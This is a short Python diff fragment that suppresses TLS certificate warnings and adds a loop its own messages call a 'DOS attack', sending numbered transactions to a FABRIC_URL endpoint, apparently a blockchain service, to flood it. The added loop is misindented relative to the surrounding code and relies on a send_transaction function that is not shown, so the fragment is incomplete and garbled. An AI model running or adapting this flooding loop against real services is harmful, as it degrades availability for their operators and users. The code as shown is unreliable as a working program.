@@ -12,3 +12,11 @@ except RequestException as e:
 
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+    print(f"Starting DOS attack: sending {NUM_TRANSACTIONS} transactions to {FABRIC_URL}...")
+    for i in range(NUM_TRANSACTIONS):
+        tx_id = f"tx_{i}"
+        value = f"value_{i}"
+        send_transaction(tx_id, value)
+    print("Attack finished.")
